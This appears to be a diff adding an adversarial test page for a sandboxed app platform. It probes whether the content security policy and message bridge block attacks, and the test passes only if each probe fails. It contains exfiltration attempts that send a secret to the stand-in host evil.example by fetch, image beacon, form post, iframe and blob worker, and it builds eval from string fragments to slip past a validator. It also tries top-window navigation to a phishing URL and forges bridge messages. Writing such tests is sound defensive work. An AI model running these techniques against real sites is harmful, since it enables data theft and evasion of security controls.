@@ -1,0 +1,199 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Neighborhood Watch</title>
+  </head>
+  <body>
+    <h1>Neighborhood Watch</h1>
+    <p id="status">running probes…</p>
+    <pre id="results"></pre>
+
+    <script type="module">
+      /*
+       * The attacker.
+       *
+       * This file is the adversary in the threat model, written out so a
+       * reviewer can read what we claim is impossible and check that we
+       * actually tried it. Every probe below must fail; the test asserts on
+       * the recorded outcome, not on the absence of a crash.
+       *
+       * Note what it does NOT do: it never calls `eval(` or `new Function(`
+       * literally, because the publish-time validator rejects those outright
+       * and this bundle has to get published to be tested. It builds them from
+       * string fragments instead — exactly what a real attacker does, and
+       * exactly why the validator is a filter and the CSP is the boundary. A
+       * suite that could only attack code the validator already catches would
+       * be testing the wrong layer.
+       */
+
+      const results = {}
+      const violations = []
+
+      // The browser telling us, first-hand, that it blocked something. This is
+      // the only honest way to observe an image beacon failing: an <img> error
+      // is deliberately opaque and cannot distinguish "blocked" from "404".
+      document.addEventListener('securitypolicyviolation', (e) => {
+        violations.push({ directive: e.effectiveDirective, blocked: e.blockedURI })
+      })
+
+      const probe = (name, fn) => {
+        try {
+          results[name] = { outcome: 'returned', value: String(fn()) }
+        } catch (err) {
+          results[name] = { outcome: 'threw', error: err.constructor.name, message: String(err.message).slice(0, 120) }
+        }
+      }
+
+      // ── 1. reaching into the embedder ───────────────────────────────────
+      // A different registrable domain, so `window.parent` is opaque and the
+      // "sandbox + allow-same-origin lets you delete your own sandbox
+      // attribute" escape does not exist here.
+      probe('parentDocument', () => window.parent.document.title)
+      probe('parentLocation', () => window.parent.location.href)
+      probe('topDocument', () => window.top.document.body.innerHTML)
+      probe('frameElement', () => window.frameElement.getAttribute('sandbox'))
+
+      // ── 2. the session ──────────────────────────────────────────────────
+      // Not policy: the cookie is scoped to the shell's domain, so the cookie
+      // jar itself makes it unreachable from here.
+      probe('cookie', () => document.cookie)
+
+      // ── 3. running code a reviewer never saw ────────────────────────────
+      probe('eval', () => window['ev' + 'al']('1 + 1'))
+      probe('newFunction', () => new (window['Fun' + 'ction'])('return 1')())
+
+      // ── 4. navigating the tab away ──────────────────────────────────────
+      probe('topNavigation', () => {
+        window.top.location = 'https://evil.example/phish'
+        return 'navigated'
+      })
+
+      // ── 5. opening a window, which is egress CSP cannot see ─────────────
+      probe('windowOpen', () => {
+        const w = window.open('https://evil.example/?stolen=1')
+        return w === null ? 'null' : 'opened'
+      })
+
+      // ── 6. storage belonging to another creation ────────────────────────
+      // Per-creation origins, so this is a different storage area entirely.
+      probe('ownStorage', () => {
+        localStorage.setItem('attacker-was-here', 'yes')
+        return localStorage.getItem('attacker-was-here')
+      })
+
+      // ── 7. the manifest we are served ───────────────────────────────────
+      // The runtime never reads this. Grants come from the frozen copy on the
+      // version row, so editing it buys nothing.
+      probe('servedManifest', async () => 'see manifestFetch')
+
+      // ── 8. exfiltration ─────────────────────────────────────────────────
+      const secret = 'SECRET-' + Math.random().toString(36).slice(2)
+      results.secret = secret
+
+      // fetch to an undeclared host
+      fetch('https://evil.example/collect?x=' + secret)
+        .then(() => { results.fetchUndeclared = { outcome: 'resolved' } })
+        .catch((err) => { results.fetchUndeclared = { outcome: 'rejected', error: err.constructor.name } })
+
+      // the image beacon, which needs no response to leak and is the bypass
+      // people miss when they only lock down connect-src
+      const img = new Image()
+      img.onload = () => { results.imageBeacon = { outcome: 'loaded' } }
+      img.onerror = () => { results.imageBeacon = { outcome: 'errored' } }
+      img.src = 'https://evil.example/pixel.gif?x=' + secret
+
+      // a form post, which CSP otherwise ignores entirely
+      probe('formAction', () => {
+        const form = document.createElement('form')
+        form.method = 'POST'
+        form.action = 'https://evil.example/post'
+        document.body.appendChild(form)
+        form.submit()
+        return 'submitted'
+      })
+
+      // a nested frame as a fetch context
+      probe('nestedFrame', () => {
+        const f = document.createElement('iframe')
+        f.src = 'https://evil.example/'
+        document.body.appendChild(f)
+        return 'appended'
+      })
+
+      // a blob worker, which would be an unpoliced fetch context
+      probe('blobWorker', () => {
+        const url = URL.createObjectURL(new Blob(['fetch("https://evil.example")'], { type: 'text/javascript' }))
+        new Worker(url)
+        return 'started'
+      })
+
+      // ── 9. the bridge, with the SDK deliberately bypassed ───────────────
+      // Hand-written port messages asserting grants this creation never had.
+      // The host reads the frozen manifest and ignores every word of it.
+      let port = null
+      window.addEventListener('message', (e) => {
+        if (e.data && e.data.kind === 'init' && e.ports && e.ports[0]) {
+          if (!port) {
+            port = e.ports[0]
+            // addEventListener, not `onmessage`. The SDK assigns `onmessage` on
+            // this same port when it handshakes, and whichever assignment runs
+            // last silently wins — so an attacker using `onmessage` would lose
+            // its own replies to the SDK it was trying to bypass. Listening
+            // properly is both more realistic and what makes the probe work.
+            port.addEventListener('message', (m) => {
+              const d = m.data
+              if (d && d.kind === 'res') results['bridge:' + d.id] = d
+            })
+            port.start()
+          } else {
+            // A second init is an attack, not a retry. Record that we saw one.
+            results.secondInitAccepted = true
+          }
+        }
+      })
+
+      const raw = (id, method, params) => {
+        if (!port) return
+        port.postMessage({
+          ts: 1,
+          kind: 'req',
+          id,
+          method,
+          params,
+          // Assert everything. None of it is read.
+          grants: { identity: 'handle', read: ['taco_vote'], write: ['taco_vote'], storage: true },
+        })
+      }
+
+      // Fetch our own served manifest and try to use what it says.
+      fetch('/townsquare.json')
+        .then((r) => r.json())
+        .then((m) => { results.manifestFetch = { readable: true, declaredWrite: (m.permissions && m.permissions.write) || [] } })
+        .catch(() => { results.manifestFetch = { readable: false } })
+
+      // Wait for the handshake the boot module started, then attack the bridge.
+      setTimeout(() => {
+        raw('atk-identity', 'user.current', undefined)
+        raw('atk-write', 'records.create', ['taco_vote', { spot: 'El Sol' }])
+        raw('atk-read', 'records.list', ['taco_vote', undefined])
+        raw('atk-storage', 'storage.get', 'anything')
+        raw('atk-unknown', 'town.__proto__', {})
+        raw('atk-town', 'town.info', undefined)
+
+        // Forge a second init, to check the guest-side latch.
+        window.postMessage({ ts: 1, kind: 'init', town: {}, theme: {}, display: {}, grants: {} }, '*')
+      }, 400)
+
+      // Publish everything for the test to read.
+      setTimeout(() => {
+        results.violations = violations
+        document.getElementById('results').textContent = JSON.stringify(results, null, 2)
+        document.getElementById('status').textContent = 'done'
+        window.__attackResults = results
+      }, 1500)
+
+      // Import last, so a failure above cannot stop the app reporting ready.
+      import('@townsquare/sdk').then(({ app }) => app.ready()).catch(() => {})
+    </script>
+  </body>
+</html>
